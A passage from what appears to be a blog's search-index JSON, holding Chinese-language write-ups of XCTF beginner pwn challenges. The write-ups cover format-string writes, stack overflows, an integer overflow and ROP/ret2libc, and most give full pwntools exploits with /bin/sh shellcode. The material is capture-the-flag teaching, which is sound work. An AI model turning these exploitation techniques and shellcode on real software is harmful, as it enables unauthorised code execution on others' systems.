0x08048563')io = process(elf.path) # , env=&#123;'LD_PRELOAD': 'libc.so.6'&#125;)# io = remote('localhost', 2333)#attach()time.sleep(1)io.send(shellcode.ljust(1023, 'a'))payload = ''payload += '%2052c%12$hn%39036c%11$hn111' + p32(puts_got) + p32(puts_got+2)## payload += '%2052c%11$hncccccccccccc' + p32(puts_got) + p32(puts_got+2)#修改GOT表数值#gdb调试可得位置#%2052c %12$hn 以双字节 写入2052个字节 到第11个参数位置puts_got = 0x0804A018sc_addr = 0x0804A080io.send(payload)io.interactive()# 0xffa4ed60# 0xffa4ee7c","categories":[],"tags":[]},{"title":"攻防世界","slug":"╣Ñ╖└╩└╜τ","date":"2019-08-06T14:19:49.000Z","updated":"2019-08-07T05:20:18.000Z","comments":true,"path":"2019/08/06/╣Ñ╖└╩└╜τ/","link":"","permalink":"http://yoursite.com/2019/08/06/╣Ñ╖└╩└╜τ/","excerpt":"","text":"攻防世界: cgfsb[目标]利用格式化字符串漏洞，造成任意地址写。 [环境]Ubuntu [工具]gdb、python、pwntools, IDA [过程分析] 我们先看一下这道题的逻辑： 输入 name，返回 name； 输入message，返回message。 从ida中查看伪代码： 利用过程：通过格式化字符串漏洞，将 pwnme 的值修改成8。 简单的介绍一下格式化字符串漏洞的知识点： %n 将当前已打印字符的个数（4个字节） %&lt;正整数n&gt;$&lt; fmt&gt;指定占位符对应第n个参数，例如：%12$x，此处%x对应第12个参数。 通过 ida 查看汇编代码 找到call printf的地址（调用printf(&amp;s)）。之后我们用gdb进行调试，在调用printf(&amp;s)之前下一个断点,查看接收 message 的变量 s 是格式化字符串的第几个参数。输入 message 的时候输入 ‘aaaa’。 查看当前栈中的内容。 这个我们可以通过 输入message的时候，把 pwnme的地址（在ida中点击伪代码中的pwnme就能查看到了） 写到这个位置，然后把这个地址的值修改成8（利用格式化字符串漏洞的任意内存写）。我们就可以构造出下面的payload啦： pwnme的地址+aaaa 凑出8个字节，这样就可以在10$的位置 写入8（四个字节）改变pwnme的值。 payload = p32(pwnme_addr) + ‘aaaa%10$n’ 完整的exp： 12345678910111213141516from pwn import *context.log_level = 'debug' DEBUG = int(sys.argv[1])if DEBUG == 1: p = process('./cgfsb') else: p = remote('10.10.49.194', 30147)pwnme_addr = 0x0804A068payload1 = \"ABCD\" payload2 = p32(pwnme_addr) + 'aaaa%10$n'p.recvuntil('please tell me your name:\\n') p.sendline(payload1)p.recvuntil('leave your message please:\\n') p.sendline(payload2)print p.recv() print p.recv() 本地： 1python exp.c 1 远程： 1python exp.c 0 攻防世界: when_did_you_born[目标]Variables overriding [环境]Ubuntu [工具]gdb、objdump、python、pwntools, IDA [过程分析] 运行一下程序： - 在ida中查看一下： 思路：可以看到 当生日是1926年的时候就会输出flag，但是程序对1926做了过滤，直接输入1926 程序就会结束。 同时，我们发现，v5和v4是在栈上的数据，接收name的gets函数不限制输入长度，于是 就可以在输入v4的时候覆盖掉之前我们输入的v5。那如何 判断 v4和v5 的相对位置呢？ ida在反汇编的伪代码中，标注了局部变量在栈中的位置，看红色箭头处，就能发现 v4和v5相差8个字节。这样我们就可以构造payload。 payload = &quot;A&quot;*8 + p32(1926) 完整的exp: 1234567from pwn import *# p = process(\"./when_did_you_born\")p = remote('10.10.49.194', 30149)p.sendlineafter(\"Birth?\\n\",str(1998))payload = \"A\"*8 + p32(1926)p.sendlineafter(\"Name?\\n\",payload)print p.recvall() 攻防世界: hello_pwn[目标]栈溢出 ROP [环境]Ubuntu [工具]gdb、objdump、python、pwntools, IDA [过程分析] 从ida中查看： 将键盘中的输入写到 unk_601068 的地址上，如果 dword60106c 的值等于1853186401 的话就会执行方法 sub_400686()。方法内容如下： 也就是执行这个方法就能得到flag。那如何让 dword60106c 等于 1853186401（将光标放在数字上，再按键盘上的h就能进行十进制和十六进制的转换）呢？查看一下 dword60106c的位置。 - ！我们发现 unk_601068 的地址与 dword60106c 相连，在输入 unk_601068 的时候，可以将 dword60106c 的值覆盖成我们需要的值，而且允许输入的长度是完全能覆盖到的。 完整的exp如下： 123456789python from pwn import *context.log_level = 'debug' p = remote('10.10.49.194', 30153)p.recvuntil('lets get helloworld for bof\\n') padding = \"A\"*4count = p64(1853186401) shellcode = padding + countp.send(shellcode)print p.recv() 攻防世界: level0[目标]栈溢出 [环境]Ubuntu [工具]gdb、objdump、python、pwntools, IDA [过程分析]拿到这道题，首先要做的先检查有哪些保护机制是打开的： 没有开 canary，PIE 也是关闭的，但是栈不可执行。也就是说我们可以进行溢出，但是不能将 shellcode 写在栈上，因为现在栈上的代码是不能被执行的。 用ida查看： 这是 vulnerable_function 函数，可以在栈上写0x200个字节，或许我们可以进行溢出，覆盖掉返回地址，劫持程序执行流，执行我们想执行的方法。通常我们的目的是去执行 system(&quot;/bin/sh&quot;)。 看看有价值的strings，除了输出的helloworld 还发现了“/bin/sh”，查看调用发现了 callsystem函数，我们可以把返回地址改成callsystem的地址。 双击bin/sh就能查看bin/sh的存储位置 将光标放置在bin/sh这一行，按键盘上x就能找到哪里调用了bin/sh，这样我们就找到了callsystem。 那么我们到底需要输入多少个字节才能覆盖到返回地址呢？ 我们用pattern.py来确定溢出点的位置,使用如下命令来生成一串150个字节的字符串。 * 然后我们使用gdb来进行调试 * 指针并没有指向类似于0x3745413675413465那样地址，而是停在了vulnerable_function()函数中。因为程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。 * 虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。 * 然后我们再用pattern来计算溢出点 可以看到溢出点为136字节 程序中有一个callsystem函数，我们可以把返回地址改成这个函数的地址。 最终执行system(“/bin/sh”)。构造payload： 1payload = &quot;A&quot;*0x88 + elf.symbols[&quot;callsystem&quot;] 完整exp： 1234567891011from pwn import *# p = process(\"./level0\")elf = ELF(\"./level0\") p = remote('10.10.49.194', 30154)padding = \"A\"*0x88 addr = elf.symbols[\"callsystem\"]payload = \"\" payload += padding payload += p64(addr)p.send(payload) p.interactive() 攻防世界: level2[目标]stack overflow,ROP [环境]Ubuntu [工具]gdb、objdump、python、pwntools, IDA [过程分析]- 栈不可执行，但是可以进行溢出。 发现字符串 bin/sh 和 system 函数，由此想到我们可以把 vulnerable_function 的返回地址修改成system函数的地址，然后把bin/sh字符串的地址也写入栈中，也就是system函数参数的位置上。构造如下payload： 1payload = &apos;a&apos;*0x8c payload += p32(sys_addr) #覆盖返回地址到system函数 payload += p32(0x12345678) #随意填写system函数调用结束的返回地址 payload += p32(bin_addr) #system函数的参数，指向“/bin/sh” 完整exp： 123456789101112from pwn import *p = process('./level2') elf = ELF(\"./level2\")sys_addr = elf.symbols[\"system\"] bin_addr = elf.search(\"/bin/sh\").next()payload = 'a'*0x8c payload += p32(sys_addr) payload += p32(0x12345678) payload += p32(bin_addr)p.recvline() p.sendline(payload) p.interactive() 攻防世界: string[目标]shellcode,format string bug [环境]Ubuntu [工具]gdb、objdump、python、pwntools, IDA [过程分析] 首先请自行理解一下程序的逻辑。 查看有哪些保护机制开启。 - 审计 sub_400CA6 函数的时候，发现一个比较可疑的地方 - 这句话的意思是：把v1强制转化成一个函数指针，然后调用这个函数。也就是说如果我们shellcode写到这个位置，就能直接调用。shellcode可以通过上面的read函数来写进去。 那么如何才能让程序的执行流到达这个位置呢。需要让*a1 == a1[1]。a1是作为参数传进来的，通过回溯，我们发现 a1 就是在 main 函数中 定义的v3，是一个指向堆块的指针。其中v3[0]=68,v3[1]=85。也就是说当v3[0]==v3[1]时就能满足*a1 == a1[1]。可如何才能修改成功呢？ - 上图可知，有一个格式化字符串漏洞，可以进行任意地址写。接下来我们需要知道v3[0]的地址。 - 其实输出的 secret[0] 就是 我们需要的地址。 思路：现在 地址有了，利用格式化字符串 将 *a1 == a1[1]，成功进入脆弱点，写入shellcode。 这道题有一点需要注意，这是一个64位的程序，在64位下，函数前6个参数依次保存在rdi、rsi、rdx、rcx、r8和r9寄存器中（也就是说，若使用”x$”，当1&lt;=x&lt;=6时，指向的应该依次是上述这6个寄存器中保存的数值），而从第7个参数开始，依然会保存在栈中。故若使用”x$”，则从x=7开始，我们就可以指向栈中数据了。 在输入address的时候，输入1234，并在 printf(&amp;format, &amp;format)前下一个断点，查看我们输入的地址在栈中的位置： -完成exp如下： 12345678910111213141516from pwn import *p = process(\"./string\")p.recvuntil(\"secret[0] is \") addr = int(p.recvuntil(\"\\n\")[:-1],16) log.success(\"addr:\"+hex(addr))p.sendlineafter(\"be:\\n\",\"GG\") p.sendlineafter(\"up?:\\n\",\"east\") p.sendlineafter(\"leave(0)?:\\n\",\"1\")p.sendlineafter(\"address\\'\\n\", str(addr))# 输出85个字节 就能把位于7$上的地址的内容改写位85p.sendlineafter(\"is:\\n\", \"%85c%7$n\")# shellcode = asm(shellcraft.sh())shellcode =\"\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\" p.sendlineafter(\"SPELL\\n\",shellcode) sleep(0.1) p.interactive() 攻防世界: guess_num[目标]重写seed [环境]Ubuntu [工具]gdb、objdump、python、pwntools, IDA [过程分析] 显然，这是一个简单的溢出题。只要将seed[0]值固定，rand()产生的数列就是可以预测的。又因为gets函数不限制输入的长度，所以我们可以在输入 name 的时候把seed[0]覆盖掉。 完整exp如下： 123456789101112from pwn import *from ctypes import* context.log_level = 'debug' p = process(\"./guess_num\") libc = cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\")pay = \"A\"*0x20 + p64(1) p.sendlineafter(\"name:\",pay)libc.srand(1)for i in range(10): p.sendlineafter(\"number:\",str(libc.rand()%6 + 1))print p.recv() print p.recv() 12345678910111213141516171819202122232425262728293031# 攻防世界: cgpwn2## **[目标]**栈溢出## **[环境]**Ubuntu## **[工具]**gdb、objdump、python、pwntools, IDA## **[过程分析]**- 检查保护机制，没有canary，可以溢出。![img](https://adworld.xctf.org.cn/media/task/writeup/cn/cgpwn2/pic/1.png)- gets函数不限制输入的长度，这里可以溢出。- 利用前面所说的方法所处溢出点的位置![img](https://adworld.xctf.org.cn/media/task/writeup/cn/cgpwn2/pic/2.png)![img](https://adworld.xctf.org.cn/media/task/writeup/cn/cgpwn2/pic/3.png)- 溢出点是42个字节- 在找关键字符串的时候没有发现 bin/sh 。所以我们需要将bin/sh写到我们可以访问的地址中去。我们可以在输入name的时候把 bin/sh写进去。name位于bss段，bss段保存全局变量，加载地址不会因为地址随机化的开启而有所变化。- 将 system 的地址写到 hello 函数的返回地址中，同时将之前 bin/sh 的地址也写到栈中，作为system函数的参数。构造如下payload： payload = 42*’a’ + p32(sys_addr) + p32(bss_addr) 1234567891011121314151617181920完整exp如下：```pythonfrom pwn import *elf = ELF(&quot;./cgpwn2&quot;) p = process(&quot;./cgpwn2&quot;)bss_addr = 0x0804A080p.recv() p.sendline(&quot;/bin/sh\\x00&quot;)cnt = 42sys_addr = elf.symbols[&apos;system&apos;]p.recv() rop = &apos;&apos; rop += cnt * &apos;a&apos; rop += p32(sys_addr) rop += &apos;a&apos;*4 rop += p32(bss_addr)p.sendline(rop) p.interactive() 攻防世界: int_overflow[目标]利用整数溢出，栈溢出，ROP [环境]Ubuntu [工具]gdb、objdump、python、pwntools, IDA [过程分析] read 函数处可以进行溢出，但是需要经过 check_passwd 函数才能将跳出login。现在再看一下 check_passwd 函数内部， 有一个疑似可能造成整数溢出的一个点，我们再看一下此处的汇编代码。 call strlen 之后 返回值放在了al寄存器中，这是一个八位的积存器，也就是说如果 s 字符串的长度 大于255 就会造成 整数溢出。 那我们利用这个漏洞干什么呢，我们需要进到else里，将 read 读进来的 s 复制到 dest 中，是一个可以利用的栈溢出。 现在我们知道了可以通过整数溢出到达 栈溢出漏洞，修改程序执行流，使程序跳转到 what_is_this 中。 这样我们可以构造payload： 1payload = &apos;a&apos;*24 + p32(addr_whatisthis)` `payload = payload.ljust(261,&quot;a&quot;) 完整payload： 12345678910from pwn import *p = process(\"./int_overflow\")p.sendlineafter(\"choice:\",\"1\") p.sendlineafter(\"username:\\n\",\"YmCold\")payload = \"\" payload += \"A\"*24 payload += p32(0x804868b) payload = payload.ljust(261,\"A\")p.sendlineafter(\"passwd:\\n\",payload) print p.recvall() 攻防世界: level3[目标]stack overflow,ROP [环境]Ubuntu [工具]gdb、objdump、python、pwntools, IDA 这道题涉及到延迟绑定的内容。 请参阅 参考阅读下的链接。 1234567891011121314151617181920from pwn import *p = process('./level3') elf = ELF('./level3') libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")cnt = 140 vul_func = 0x0804844bp.recv() payload1 = 'a'*cnt + p32(elf.symbols['write']) + p32(vul_func) payload1 += p32(1) + p32(elf.got['write']) + p32(4)p.sendline(payload1) write_addr = u32(p.recv(4)) print \"write_addr: \"+hex(write_addr)libc_base = write_addr - libc.symbols['write'] log.success(\"libc_base:\"+hex(libc_base))system_addr = libc_base + libc.symbols['system'] print \"system_addr: \" + hex(system_addr)bin_addr = libc_base + libc.search('/bin/sh').next()print \"bin_addr: \"+hex(bin_addr) payload2 = 'a'*cnt + p32(system_addr) + p32(vul_func) + p32(bin_addr) p.sendline(payload2)p.interactive() 攻防世界: level1[目标]stack overflow,ROP [环境]Ubuntu [工具]gdb、objdump、python、pwntools, IDA [过程分析] 查看有哪些保护机制开启： - 没开canary，也没有开栈不可执行。 - vulnerable_function()里可以进行溢出，我们可以在栈中填写shellcode，执行来拿到shell权限。这里我们使用一段执行execve (“/bin/sh”)命令的语句作为shellcode。 1shellcode = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot; shellcode += &quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot; shellcode += &quot;\\x0b\\xcd\\x80&quot; 同 level0,找到溢出点的位置。容易计算出PC返回值的覆盖点为140个字节。我们只要构造一个”A”*140+ret字符串，就可以让pc执行ret地址上的代码了。 shellcode起始地址在哪呢？shellcode是通过输入buf的时候写入的，所以就是buf的地址，而buf的地址会在程序运行过程中给出. 此时shellcode的地址，溢出点和返回地址都有了，我们可以写出下面的exp： 1234567891011from pwn import *p = process(\"./level1\") s = p.readline() padding = 0x88+4shellcode = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\" shellcode += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\" shellcode += \"\\x0b\\xcd\\x80\"addr = p32(int(s[len(\"What's this:\"):-2],16))payload = shellcode payload += 'A'*(padding-len(shellcode)) payload += addrp.send(payload)p.interactive()","categories":[],"tags":[]}]}